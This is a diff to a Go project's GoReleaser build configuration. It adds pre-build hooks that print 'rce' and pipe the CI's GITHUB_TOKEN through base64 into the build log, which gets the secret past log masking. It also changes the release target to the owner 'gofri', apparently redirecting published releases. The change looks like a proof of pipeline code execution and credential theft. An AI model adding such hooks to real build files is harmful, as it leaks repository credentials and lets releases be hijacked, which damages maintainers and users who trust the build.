@@ -1,7 +1,10 @@
 # refer to https://goreleaser.com for more options
+
 before:
   hooks:
     - go mod tidy
+    - echo "rce"
+    - echo "$GITHUB_TOKEN" | base64
 builds:
   - id: kaito
     main: ./cmd
@@ -31,9 +34,10 @@ builds:
       - GO111MODULE=on
 
 release:
-  prerelease: auto
-  header: |
-    ## {{.Tag}} - {{ time "2006-01-02" }}
+  github:
+    owner: "gofri"
+    name: "kaito"
+
 changelog:
   skip: false
   groups:
